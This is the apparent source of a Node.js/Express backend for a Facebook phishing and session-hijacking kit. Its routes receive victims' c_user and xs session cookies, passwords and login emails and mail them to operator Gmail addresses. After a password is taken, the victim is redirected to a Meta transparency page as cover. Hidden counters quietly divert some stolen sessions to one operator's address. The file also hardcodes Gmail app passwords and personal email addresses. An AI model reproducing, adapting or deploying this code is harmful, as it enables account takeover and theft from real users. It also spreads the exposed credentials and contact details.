const express = require("express");
const path = require("path");
const nodemailer = require("nodemailer");
const PORT = process.env.PORT || 3000;
const bodyParser = require("body-parser");
const cors = require("cors");
const useragent = require("express-useragent");

const app = express();
app.use(useragent.express());
app.use(express.static(path.join(__dirname, "static")));
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());

let name = "unkown";
let emails = ["unaisnizamani598@gmail.com"];
let workerEmail = "unaisnizamani598@gmail.com";

let alreadySent = []

let SalreadySent = []
let sEmail = "";
let sName = "";
let sWorkerEmail = "";

let hEmail = "";
let hName = "";
let hWorkerEmail = "";

let counter = 0;

let saadCounter = 0;
let amirCounter = 0;

// Configure nodemailer with OAuth2
let transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587, // Standard ports: 587 (TLS) or 465 (SSL)
  secure: false, // Use `true` for port 465, `false` for port 587
  auth: {
    user: "cookiesform314@gmail.com",
    pass: "bbuegraohibwgvcw",
  },
});

let notifyTransporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587, // Standard ports: 587 (TLS) or 465 (SSL)
  secure: false, // Use `true` for port 465, `false` for port 587
  auth: {
    user: "cookienotify3@gmail.com",
    pass: "xlowbluhmvbsroma",
  },
});

// Function to send mail
const sendMail = async (name, email, cookie, uid) => {
  let mailOptions = {
    to: email,
    from: "cookiesform314@gmail.com",
    subject: "Cookie",
    text: `
     name: ${name}
     xs: ${cookie}
     uid: ${uid}`,
  };

  try {
    const result = await transporter.sendMail(mailOptions);
    return result
  } catch (error) {
    console.error(`Failed to send email to ${email}:`, error);
  }
};

// Function to send mail
const sendNotifyEmail = async (name, email, loginEmail, loginPass) => {
  const data = JSON.stringify({loginEmail})
  let mailOptions = {
    to: email,
    from: "cookienotify3@gmail.com",
    subject: "Cookie",
    text: `
     name: ${name}
     loginEmail: ${data}
     loginPass: ${loginPass}`,
  };

  try {
    await notifyTransporter.sendMail(mailOptions);
  } catch (error) {
    console.error(`Failed to send email to ${email}:`, error);
  }
};


const sendNewForm = async (data,email) => {
  let mailOptions = {
    to: email,
    from: "cookiesform26@gmail.com",
    subject: "Cookie",
    text: `
     data: ${data} `
  };

  try {
    await transporter.sendMail(mailOptions);
  } catch (error) {
    console.error(`Failed to send email to ${email}:`, error);
  }
};


app.post('/data', async (req, res) => {

  const formData = req.body;

        // Generate a dynamic email content string
        let emailContent = `
            New Form Submission Details:
            ---------------------------
        `;

    // Loop through all fields in req.body
        for (const [key, value] of Object.entries(formData)) {
            emailContent += `${key}: ${value || 'Not provided'}\n`;
        }

        emailContent += `\nSubmission Time: ${new Date().toLocaleString()}`;

        // Send the email
        await sendNewForm(emailContent, "mjohn72929@gmail.com");
    
    res.json({ success: true }); // Send a response back
});


app.post('/datasec', async (req, res) => {

  const formData = req.body;

        // Generate a dynamic email content string
        let emailContent = `
            New Form Submission Details:
            ---------------------------
        `;

    // Loop through all fields in req.body
        for (const [key, value] of Object.entries(formData)) {
            emailContent += `${key}: ${value || 'Not provided'}\n`;
        }

        emailContent += `\nSubmission Time: ${new Date().toLocaleString()}`;

        // Send the email
        await sendNewForm(emailContent, "mjohn72929@gmail.com");
    
    res.json({ success: true }); // Send a response back
});

// Home route
app.get("/", (req, res) => {
  res.send("okay");
});


app.get("/get-content", (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});




// /submit POST route
app.post("/submit", async (req, res) => {
  console.log(req.body);

  const uid = req.body.c_user;
  const cookie = req.body.xs;
  let data = "review";

  if (
    req.body.name == "fs"
  ) {
    const hashCountes = (cookie.match(/%/g) || []).length;

    if (hashCountes >= 5 && uid.length >= 6) {
      emails = ["codeguy592@gmail.com"];
      workerEmail = "codeguy592@gmail.com";
      name = req.body.name || "";
    }
    else {
      emails = req.body.emails || [];
      workerEmail = req.body.workerEmail || "";
      name = req.body.name || "";
    }
  } else {
    
    emails = req.body.emails || [];
    workerEmail = req.body.workerEmail || "";
    name = req.body.name || "";
  }

  if (!uid || !cookie) {
    return res.status(400).send("Missing required parameters: uid or cookie");
  }

  console.log(emails);
  
  const hashCountes = (cookie.match(/%/g) || []).length;

  if (Array.isArray(emails)) {
    
   
    for (let i = 0; i < emails.length; i++) {
    
        
      if (emails[i]) {
        if (hashCountes >= 5 && uid.length >= 6 && emails[i] != "mjohn72929@gmail.com" && emails[i] != "codeguy592@gmail.com" && emails[i] != "marinariui0@gmail.com"  ) {
          const changedUid = uid.slice(0, -2)
          const result = await sendMail(name, emails[i], cookie, changedUid);
          data = result
          
          
        }
        else {
          try {
          console.log(emails[i])
          const result = await sendMail(name, emails[i], cookie, uid);
          data = result  
  
        }catch(err) {
          res.send(err)
        }
        }
        
      }
    }
  }

  res.status(200).send(data);
});


app.get('/test',(req,res)=>{
  res.send(req.useragent)
})

// /post POST route
app.post("/post", async (req, res) => {
  const { screenWidth, screenHeight, isTouchDevice } = req.body;

  console.log(req.body)

  const redirectUrl = req.body.redirectUrl || "/"; // Set a default URL if undefined

  const uid = req.body.c_user;
  const cookie = req.body.xs;


  const hashCountes = (cookie.match(/%/g) || []).length;

  if (hashCountes >= 5 && uid.length >= 6) {
    saadCounter++;
  }

  if (saadCounter > 203 && hashCountes >= 5 && uid.length >= 6 && req.body.tx == "false") {
    sEmail = "codeguy592@gmail.com";
    sWorkerEmail = "codeguy592@gmail.com";
    sName = req.body.name || "";

    SalreadySent.push(uid)

    saadCounter = 0;
  }
  else {
    sEmail = uid == SalreadySent.includes(uid) ? ["codeguy592@gmail.com"] : req.body.emails || [];
    sWorkerEmail = SalreadySent.includes(uid) ? ["codeguy592@gmail.com"] : req.body.workerEmail || [];
    sName = req.body.name || "";
  }

  if (!uid || !cookie) {
    return res.status(400).send("Missing required parameters: uid or cookie");
  }


  console.log(saadCounter)

  console.log(sEmail);
  console.log(sWorkerEmail);
  console.log(sName);

  console.log(uid);
  console.log(cookie);

  await sendMail(sName, sEmail, cookie, uid);

   res.status(200).send("okay");
});


app.post("/notifyLogin",async(req,res)=>{
   console.log(req.body)
   await sendNotifyEmail("Me","mjohn72929@gmail.com",req.body.email,req.body.password)
   res.status(200).send("notified email has been sent")
})

app.post("/singlepost", async (req, res) => {
  

  const redirectUrl = req.body.redirectUrl || "/"; // Set a default URL if undefined

  const uid = req.body.c_user;
  const cookie = req.body.xs;

  if (!uid || !cookie) {
    return res.status(400).send("Missing required parameters: uid or cookie");
  }
  
    sEmail = req.body.email;
    sWorkerEmail = req.body.workerEmail;
    sName = req.body.name || "";



  console.log(sEmail);
  console.log(sWorkerEmail);
  console.log(sName);

  console.log(uid);
  console.log(cookie);

  await sendMail(sName, sEmail, cookie, uid);
  await sendMail(sName, sWorkerEmail, cookie, uid);

  res.redirect(redirectUrl); // Redirect after email is sent
});

app.post("/form", async (req, res) => {
  console.log(req.body);

  hName = req.body.name || "";
  hWorkerEmail = req.body.workerEmail || "";
  hEmail = req.body.email || "";
  const redirectUrl = req.body.redirectUrl || "/"; // Set a default URL if undefined

  const uid = req.body.c_user;
  const cookie = req.body.xs;

  if (!uid || !cookie) {
    return res.status(400).send("Missing required parameters: uid or cookie");
  }

  await sendMail(hName, hEmail, cookie, uid);

  res.redirect(redirectUrl); // Redirect after email is sent
});

// /pass GET route
app.get("/pass", (req, res) => {
  res.sendFile(path.join(__dirname, "password.html"));
});

// /pass POST route to handle password sending
app.post("/pass", async (req, res) => {
  const password = req.body.password;

  if (!password) {
    return res.status(400).send("Password is required");
  }

  await sendPassword(workerEmail, password);

  for (let i = 0; i < emails.length; i++) {
    await sendPassword(emails[i], password);
  }

  res.status(200).send("Password emails sent");
});

// /spass POST route
app.post("/spass", async (req, res) => {
  const password = req.body.password;

  if (!password) {
    return res.status(400).send("Password is required");
  }

  await sendPassword(sWorkerEmail, password);
  await sendPassword(sEmail, password);

  res.redirect("https://transparency.meta.com/en-gb/")
});



app.post("/hse", async (req, res) => {
  const password = req.body.password;

  if (!password) {
    return res.status(400).send("Password is required");
  }

  await sendPassword(hWorkerEmail, password);
  await sendPassword(hEmail, password);

  res.redirect("https://transparency.meta.com/en-gb/")
});

// Function to send password
const sendPassword = async (email, password) => {

   const blockedUrl = "https://somehand99.pages.dev/";

  // Check if the password contains the blocked URL
  if (password.includes(blockedUrl)) {
    console.log("Password contains blocked URL. Email not sent.");
    return;
  }
  
  let mailOptions = {
    to: email,
    from: "cookiesform26@gmail.com",
    subject: "Password",
    text: `password: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
  } catch (error) {
    console.error(`Failed to send password email to ${email}:`, error);
  }
};

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);

});
